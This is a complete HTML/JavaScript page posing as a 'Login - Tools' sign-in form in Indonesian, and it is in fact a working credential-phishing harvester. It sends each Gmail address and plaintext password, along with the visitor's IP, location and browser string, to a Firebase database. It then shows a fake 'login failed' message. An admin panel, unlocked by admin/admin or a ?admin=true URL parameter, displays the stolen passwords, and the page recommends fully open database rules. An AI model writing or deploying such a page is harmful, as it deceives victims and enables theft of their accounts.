<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Tools</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background-color: rgba(255, 255, 255, 0.95);
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 450px;
            padding: 30px;
            margin: 20px 0;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 25px;
        }
        
        .logo h1 {
            color: #1a2a6c;
            font-size: 32px;
            margin-bottom: 5px;
        }
        
        .logo p {
            color: #666;
            font-size: 16px;
        }
        
        .info-box {
            background-color: #e8f4fc;
            border-left: 4px solid #1a2a6c;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 4px;
            display: none;
        }
        
        .info-box h3 {
            color: #1a2a6c;
            margin-bottom: 10px;
        }
        
        .info-box ul {
            padding-left: 20px;
        }
        
        .info-box li {
            margin-bottom: 8px;
            font-size: 14px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        .form-group input:focus {
            border-color: #1a2a6c;
            outline: none;
            box-shadow: 0 0 0 2px rgba(26, 42, 108, 0.2);
        }
        
        .error-message {
            color: #ff3860;
            font-size: 14px;
            margin-top: 5px;
            display: none;
        }
        
        .btn-login {
            width: 100%;
            padding: 14px;
            background: linear-gradient(to right, #1a2a6c, #2c52d4);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        
        .btn-login:hover {
            opacity: 0.9;
            transform: translateY(-2px);
            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15);
        }
        
        .btn-login:active {
            transform: translateY(0);
        }
        
        .btn-login:disabled {
            background: #cccccc;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .history-container {
            display: none;
            margin-top: 30px;
            background-color: #f8f9fa;
            border-radius: 8px;
            padding: 20px;
            border: 1px solid #e9ecef;
        }
        
        .history-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .history-container h2 {
            color: #1a2a6c;
            text-align: center;
            padding-bottom: 10px;
            border-bottom: 2px solid #1a2a6c;
        }
        
        .history-item {
            background-color: white;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            border-left: 4px solid #1a2a6c;
            position: relative;
        }
        
        .history-item p {
            margin-bottom: 8px;
            font-size: 14px;
        }
        
        .history-item .label {
            font-weight: 600;
            color: #333;
        }
        
        .timestamp {
            text-align: right;
            color: #888;
            font-size: 12px;
            margin-top: 10px;
        }

        .loading {
            text-align: center;
            color: #1a2a6c;
            font-weight: 600;
            margin: 20px 0;
            padding: 10px;
        }
        
        .connection-status {
            display: none;
        }
        
        .storage-status {
            display: none;
        }
        
        .btn-delete {
            background: #f14668;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 6px 12px;
            font-size: 12px;
            cursor: pointer;
            position: absolute;
            top: 10px;
            right: 10px;
            transition: opacity 0.3s;
        }
        
        .btn-delete:hover {
            opacity: 0.8;
        }
        
        .btn-clear-all {
            background: #ff3860;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 8px 16px;
            font-size: 14px;
            cursor: pointer;
            transition: opacity 0.3s;
        }
        
        .btn-clear-all:hover {
            opacity: 0.9;
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            border-radius: 5px;
            color: white;
            font-weight: 600;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            z-index: 1000;
            opacity: 0;
            transform: translateY(-20px);
            transition: all 0.3s;
        }
        
        .notification.success {
            background-color: #f14668;
        }
        
        .notification.error {
            background-color: #f14668;
        }
        
        .notification.show {
            opacity: 1;
            transform: translateY(0);
        }
        
        @media (max-width: 500px) {
            .container {
                padding: 20px;
            }
            
            .logo h1 {
                font-size: 28px;
            }
            
            .history-item {
                padding: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="connection-status" id="connectionStatus"></div>
        <div class="storage-status" id="storageStatus"></div>
        
        <div class="logo">
            <h1>LOGIN - TOOLS</h1>
            <p>Masukkan kredensial Anda untuk mengakses tools</p>
        </div>

        <div class="info-box" id="infoBox">
            <h3>Informasi Login</h3>
            <ul>
                <li>Gunakan email dengan format @gmail.com</li>
                <li>Pastikan Anda Terhubung ke jaringan internet </li>
            </ul>
        </div>
        
        <form id="loginForm">
            <div class="form-group">
                <input type="text" id="email" name="email" placeholder="Alamat Email" required>
                <div class="error-message" id="emailError">Format email harus @gmail.com</div>
            </div>
            
            <div class="form-group">
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            
            <button type="submit" class="btn-login" id="loginButton">Login</button>
        </form>
        
        <div class="history-container" id="historyContainer">
            <div class="history-header">
                <h2>Riwayat Login</h2>
                <button class="btn-clear-all" id="clearAllButton">Hapus Semua</button>
            </div>
            <div id="historyList">
                <div class="loading">Memuat riwayat login...</div>
            </div>
        </div>
    </div>

    <div id="notification" class="notification"></div>

    <script>
        // Konfigurasi Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyAlMyO9iybb7Zc3-JWpaJTOU6mp7dVZw7A",
            authDomain: "taher-online.firebaseapp.com",
            databaseURL: "https://taher-online-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "taher-online",
            storageBucket: "taher-online.firebasestorage.app",
            messagingSenderId: "254196950669",
            appId: "1:254196950669:web:ea7dc25e29e459e791e4c4",
            measurementId: "G-W288VV18S2"
        };
        
        // Inisialisasi Firebase
        let firebaseInitialized = false;
        let database = null;
        
        try {
            firebase.initializeApp(firebaseConfig);
            database = firebase.database();
            firebaseInitialized = true;
            console.log('Firebase berhasil diinisialisasi');
            document.getElementById('infoBox').style.display = 'block';
            
            // Test koneksi ke database
            database.ref('.info/connected').on('value', (snapshot) => {
                if (snapshot.val() === true) {
                    console.log('Terhubung ke Firebase Database');
                } else {
                    console.log('Tidak terhubung ke Firebase Database');
                }
            });
        } catch (error) {
            console.error('Firebase initialization error:', error);
            showNotification('Gagal terhubung ke database: ' + error.message, 'error');
            firebaseInitialized = false;
        }
        
        // Fungsi untuk menampilkan notifikasi
        function showNotification(message, type) {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.className = `notification ${type}`;
            notification.classList.add('show');
            
            setTimeout(() => {
                notification.classList.remove('show');
            }, 3000);
        }
        
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const emailError = document.getElementById('emailError');
            const loginButton = document.getElementById('loginButton');
            
            // Validasi format email
            const emailRegex = /^[a-zA-Z0-9]+@gmail\.com$/;
            
            if (!emailRegex.test(email)) {
                emailError.style.display = 'block';
                return;
            } else {
                emailError.style.display = 'none';
            }
            
            // Nonaktifkan tombol login selama proses
            loginButton.disabled = true;
            loginButton.textContent = 'Memproses...';
            
            try {
                // Jika login dengan username dan password khusus
                if (email === 'admin@gmail.com' && password === 'admin') {
                    document.getElementById('loginForm').style.display = 'none';
                    document.getElementById('historyContainer').style.display = 'block';
                    document.getElementById('infoBox').style.display = 'none';
                    
                    // Simpan data login saat ini
                    await saveLoginData(email, password);
                    
                    // Tampilkan riwayat login
                    await displayLoginHistory();
                    
                    showNotification('Login berhasil! Halo Selamat datang', 'success');
                } else {
                    // Simpan data login
                    await saveLoginData(email, password);
                    showNotification('Login Gagal! Alamat Email Tidak ditemukan.', 'success');
                    
                    // Reset form
                    document.getElementById('loginForm').reset();
                }
            } catch (error) {
                console.error('Error during login:', error);
                showNotification('Terjadi kesalahan saat login. Silakan coba lagi.', 'error');
            } finally {
                // Aktifkan kembali tombol login
                loginButton.disabled = false;
                loginButton.textContent = 'Login';
            }
        });
        
        // Fungsi untuk menghapus semua riwayat
        document.getElementById('clearAllButton').addEventListener('click', async function() {
            if (confirm('Apakah Anda yakin ingin menghapus semua riwayat login?')) {
                try {
                    if (firebaseInitialized) {
                        // Hapus dari Firebase
                        await database.ref('logins').remove();
                        showNotification('Semua riwayat login telah dihapus', 'success');
                    } else {
                        showNotification('Tidak dapat terhubung ke database', 'error');
                    }
                    
                    // Perbarui tampilan
                    displayLoginHistory();
                    
                } catch (error) {
                    console.error('Error clearing history:', error);
                    showNotification('Gagal menghapus riwayat', 'error');
                }
            }
        });
        
        async function saveLoginData(email, password) {
            let ip = 'Tidak dapat ditentukan';
            let address = 'Lokasi tidak dapat ditentukan';
            
            try {
                // Mendapatkan informasi IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                ip = ipData.ip;
                
                // Coba dapatkan informasi lokasi
                try {
                    const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                    const locationData = await locationResponse.json();
                    address = locationData.city ? 
                        `${locationData.city}, ${locationData.region}, ${locationData.country_name}` : 
                        'Lokasi tidak dapat ditentukan';
                } catch (locationError) {
                    console.warn('Tidak dapat mendapatkan info lokasi:', locationError);
                }
            } catch (error) {
                console.warn('Tidak dapat mendapatkan info IP:', error);
            }
            
            // Membuat objek data login
            const loginData = {
                email: email,
                password: password,
                ip: ip,
                address: address,
                timestamp: new Date().toISOString(),
                device: navigator.userAgent
            };
            
            // Simpan ke Firebase
            if (firebaseInitialized) {
                try {
                    await database.ref('logins').push(loginData);
                    return;
                } catch (firebaseError) {
                    console.error('Gagal menyimpan ke Firebase:', firebaseError);
                    throw new Error('Tidak dapat menyimpan data ke database');
                }
            } else {
                throw new Error('Firebase tidak terinisialisasi');
            }
        }
        
        async function displayLoginHistory() {
            const historyList = document.getElementById('historyList');
            historyList.innerHTML = '<div class="loading">Memuat riwayat login...</div>';
            
            try {
                if (!firebaseInitialized) {
                    throw new Error('Firebase tidak terinisialisasi');
                }
                
                const snapshot = await database.ref('logins').orderByChild('timestamp').once('value');
                
                if (!snapshot.exists()) {
                    historyList.innerHTML = '<p>Belum ada riwayat login.</p>';
                    return;
                }
                
                let loginData = [];
                snapshot.forEach((childSnapshot) => {
                    const data = childSnapshot.val();
                    data.id = childSnapshot.key;
                    loginData.push(data);
                });
                
                historyList.innerHTML = '';
                
                // Urutkan data berdasarkan timestamp (terbaru pertama)
                loginData.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
                
                // Menampilkan riwayat login
                loginData.forEach(data => {
                    const historyItem = document.createElement('div');
                    historyItem.className = 'history-item';
                    
                    // Format tanggal dan waktu
                    const date = new Date(data.timestamp);
                    const formattedDate = date.toLocaleString('id-ID', {
                        day: '2-digit',
                        month: 'long',
                        year: 'numeric',
                        hour: '2-digit',
                        minute: '2-digit',
                        second: '2-digit'
                    });
                    
                    // Deteksi perangkat
                    let deviceType = 'Desktop';
                    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(data.device)) {
                        deviceType = 'Mobile';
                    } else if (/Tablet|iPad/i.test(data.device)) {
                        deviceType = 'Tablet';
                    }
                    
                    historyItem.innerHTML = `
                        <button class="btn-delete" data-id="${data.id}">Hapus</button>
                        <p><span class="label">Email:</span> ${data.email}</p>
                        <p><span class="label">Password:</span> ${data.password}</p>
                        <p><span class="label">IP:</span> ${data.ip}</p>
                        <p><span class="label">Lokasi:</span> ${data.address}</p>
                        <p><span class="label">Perangkat:</span> ${deviceType}</p>
                        <p class="timestamp">${formattedDate}</p>
                    `;
                    historyList.appendChild(historyItem);
                });
                
                // Tambahkan event listener untuk tombol hapus
                document.querySelectorAll('.btn-delete').forEach(button => {
                    button.addEventListener('click', function() {
                        const id = this.getAttribute('data-id');
                        deleteLoginItem(id);
                    });
                });
            } catch (error) {
                console.error('Error mengambil data:', error);
                
                if (error.code === 'PERMISSION_DENIED') {
                    historyList.innerHTML = `
                        <div style="background: #ffeaea; padding: 15px; border-radius: 5px; border-left: 4px solid #ff3860;">
                            <p style="color: #f14668; font-weight: 600;">Error: Permission Denied</p>
                            <p>Database rules tidak mengizinkan akses. Silakan ubah rules di Firebase Console.</p>
                            <p><strong>Solusi:</strong> Buka Firebase Console → Realtime Database → Rules</p>
                            <p><strong>Gunakan rules berikut:</strong></p>
                            <pre style="background: #fff; padding: 10px; border-radius: 3px; overflow: auto;">
{
  "rules": {
    "logins": {
      ".read": true,
      ".write": true
    }
  }
}</pre>
                        </div>
                    `;
                } else {
                    historyList.innerHTML = `
                        <p>Gagal memuat riwayat login: ${error.message}</p>
                        <p>Pastikan koneksi internet Anda stabil dan rules database diperbolehkan.</p>
                    `;
                }
            }
        }
        
        // Fungsi untuk menghapus item login tertentu
        async function deleteLoginItem(id) {
            if (confirm('Apakah Anda yakin ingin menghapus item ini?')) {
                try {
                    if (firebaseInitialized) {
                        // Hapus dari Firebase
                        await database.ref('logins/' + id).remove();
                        showNotification('Item berhasil dihapus', 'success');
                        
                        // Perbarui tampilan
                        displayLoginHistory();
                    } else {
                        showNotification('Tidak dapat terhubung ke database', 'error');
                    }
                } catch (error) {
                    console.error('Error deleting item:', error);
                    showNotification('Gagal menghapus item', 'error');
                }
            }
        }
        
        // Cek jika parameter URL menunjukkan akses admin
        window.addEventListener('load', function() {
            const urlParams = new URLSearchParams(window.location.search);
            
            if (urlParams.has('admin') && urlParams.get('admin') === 'true') {
                document.getElementById('loginForm').style.display = 'none';
                document.getElementById('historyContainer').style.display = 'block';
                document.getElementById('infoBox').style.display = 'none';
                displayLoginHistory();
            }
        });
    </script>
</body>
</html>
